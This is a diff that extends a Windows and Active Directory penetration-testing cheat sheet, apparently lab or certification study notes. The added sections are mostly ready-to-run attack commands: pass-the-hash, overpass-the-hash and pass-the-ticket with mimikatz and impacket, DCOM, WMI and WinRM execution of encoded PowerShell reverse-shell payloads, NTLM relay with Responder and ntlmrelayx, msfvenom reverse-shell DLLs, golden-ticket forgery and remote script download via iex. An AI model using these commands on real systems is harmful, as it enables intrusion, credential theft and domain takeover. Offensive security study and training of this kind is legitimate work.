@@ -15,10 +15,11 @@ There are several key pieces of information we should always obtain:
 ```bash
 > powershell
 > whoami
-> whoami /groups
+> whoami /all
 > net user
 > net user steve
 > Get-ChildItem Env: # Environment Variables
+> $env:appkey
 > Get-LocalUser
 > Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
 > Get-LocalGroupMember adminteam
@@ -39,18 +40,23 @@ There are several key pieces of information we should always obtain:
 > dir "C:\Users\jim\Downloads"
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
 > Get-Process
-> Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
+> Get-Process NonStandardProcess | Select-Object Path
+> Get-Process -Name notepad | Select-Object -ExpandProperty "Path"
+# Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
+> Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
+> LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
 # We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
 > setspn -L iis_service # or any server,client you discover
 > net accounts # Obtain the account policy, lockout threshold
+> mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
 ```
 
 ### PowerView.ps1
@@ -345,6 +351,96 @@ We should have the ticket ready to use in memory. We can confirm this with klist
 PS C:\Tools> iwr -UseDefaultCredentials http://web04
 ```
 
+#### Pass the Hash
+
+First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments. This lateral movement technique also requires the admin share called ADMIN$ to be available. To establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.
+
+```bash
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+
+#### Overpass the Path
+
+The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.
+
+If you run any process as another domain user on a machine you have compromised, their ntlm hash and kerberos ticket will be cached on the computer, where you can run MimiKatz to pass the hash.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
+```
+
+At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets
+
+```bash
+PS C:\Windows\system32> klist
+PS C:\Windows\system32> net use \\files04 # We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.
+PS C:\Windows\system32> klist # You will now have tgt and tgs
+```
+
+We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). 
+
+```bash
+PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
+```
+
+#### Pass the Ticket
+
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
+
+```bash
+PS C:\Windows\system32> ls \\web04\backup
+ls : Access to the path '\\web04\backup' is denied.
+mimikatz #privilege::debug
+mimikatz #sekurlsa::tickets /export
+PS C:\Tools> dir *.kirbi
+# As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
+mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+PS C:\Tools> klist # Since no errors, we should expect a ticket
+PS C:\Tools> ls \\web04\backup # the dave ticket has been successfully imported in our own session for the jen user
+```
+
+#### DCOM
+
+```bash
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.193.72"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+
+#### Net-NTLMv2
+
+At a high level, we'll send the server a request, outlining the connection details to access the SMB share. Then the server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity. The server will then check our challenge response and either grant or deny access, accordingly.
+
+Cracking:
+
+```bash
+kali@kali:~$ sudo responder -I tun0
+# Try to list fake share at your Kali IP
+C:\Windows\system32>dir \\192.168.119.2\test
+# Save the NTLMv2 hash that is produced
+kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+```
+Passing:
+
+If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack. impacket-ntlmrelayx does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.
+
+We'll use --no-http-server to disable the HTTP server since we are relaying an SMB connection and -smb2support to add support for SMB2. We'll also use -t to set the target to FILES02. Finally, we'll set our command with -c, which will be executed on the target system as the relayed user. We'll use a PowerShell reverse shell one-liner, which we'll base64-encode and execute with the -enc argument.
+
+```bash
+kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+kali@kali:~$ nc -nvlp 8080
+# Now we'll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After we connect, we'll enter dir \\192.168.119.2\test to create an SMB connection to our Kali machine. Again, the remote folder name is arbitrary.
+kali@kali:~$  nc 192.168.50.211 5555 # Simulating command execution
+C:\Windows\system32>dir \\192.168.119.2\test # your kali ip
+```
+
 #### Create a Backdoor User
 
 You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
@@ -627,6 +723,8 @@ Note that you can create a reverse shell dll:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=443 -f dll -o beyondhelper.dll
+# or
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll
 ```
 
 Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.
@@ -639,7 +737,7 @@ After applying the filter, the list is empty. In order to analyze the service bi
 > Restart-Service BetaService
 ```
 
-Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called is 
+Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called. There are going to be a shit ton of calls in Procmon.. take your time and check everything.
 
 1. The directory from which the application loaded.
 2. The system directory.
@@ -823,9 +921,9 @@ token::elevate /domainadmin
 privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
+lsadump::lsa /inject
 sekurlsa::msv
 sekurlsa::ekeys
-lsadump::lsa /inject
 lsadump::sam
 lsadump::secrets
 lsadump::cache
@@ -874,34 +972,47 @@ proxychains crackmapexec smb dev02-corp -u Administrator -p Password123! --local
 proxychains crackmapexec smb web02-corp -u Matthew.Lucas -H 5bcoe56i4645ho43h2ei534rsat --lsa
 ```
 
+#### Enter Powershell Session as Another User
+
+```bash
+PS C:\Users\dave> $password = ConvertTo-SecureString "Dolphin1" -AsPlainText -Force
+
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("sql_svc", $password)
+
+PS C:\Users\dave> Enter-PSSession -ComputerName MS02 -Credential $cred
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
+clientwk220\daveadmin
+```
+
+#### RDP Session Inception
+
+```bash
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:dev04.medtech.com"
+```
+
 #### Force to Reset Password
 
 ```bash
 # Import the PowerView module
 iex (new-object net.webclient).DownloadString('http://192.168.45.231/PowerView.ps1')
-
 # Convert the new password to a secure string                                  
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force      
-
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 # Create a PSCredential object with an account that has permissions to reset   
-passwords                                                                      
+passwords	
 $Cred = New-Object System.Management.Automation.PSCredential('web02.dmz.medtech.com\\Administrator', (ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force))
 
 # Reset the password for the user 'nina'                                       
-Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose                                                     
-
+Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose
 # If you need to set the password for another user, repeat the process with the correct details
 # For example, for a user named 'User.Name':
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('web02\Administrator', $SecPassword)
-
-# Reset the password                                                           
+# Reset the password
 Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose
-
 # Optionally, if you need to set a script path for the user object             
 # Replace <User.Name>, $ip, <file> with actual values                          
-Set-DomainObject -Identity 'User.Name' -Set                                    
-@{"scriptpath"="\\$ip\share\<file>.bat"} -Credential $cred -Verbose            
+Set-DomainObject -Identity 'User.Name' -Set @{"scriptpath"="\\$ip\share\<file>.bat"} -Credential $cred -Verbose            
 ```
 
 #### Executing Remote Commands
@@ -919,6 +1030,57 @@ impacket-secretsdump svcorp/pete@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rs
 evil-winrm -i 10.10.10.15 -u pete -H 5bcoe56i4645ho43h2ei534rsat
 upload msfvenom_shell.exe # For a better shell
 C:\Windows\Tools\msfvenom_shell.exe # Execute executable
+
+# PsExec64.exe, make sure this file is transferred
+PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+
+#### WMI and WinRM for Remote Commands and Shells
+
+WMI is great for creating processes on a remote windows machine using either a password or hash. The authentication must be part of the Local Administrators. It uses port 135 for remote procedure calls.
+
+```bash
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+
+PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     3948           0 192.168.50.73
+```
+
+```bash
+C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
+
+```bash
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
+
+PS C:\Users\jeff> Enter-PSSession 1
+[192.168.50.73]: PS C:\Users\jen\Documents> whoami
+corp\jen
+
+[192.168.50.73]: PS C:\Users\jen\Documents> hostname
+FILES04
 ```
 
 #### Amazing Enumeration Cheatsheet
@@ -1006,3 +1168,18 @@ New-NetFirewallRule -DisplayName "SSH" -Direction Inbound -Protocol TCP -LocalPo
 #### Privesccheck
 
 It was recommended to use this in addition to winpeas, 'https://github.com/itm4n/PrivescCheck'.
+
+#### Golden Ticket
+
+```bash
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+mimikatz # misc::cmd # Launch a new command prompt
+```
+
+```bash
+# Verify
+C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
+```
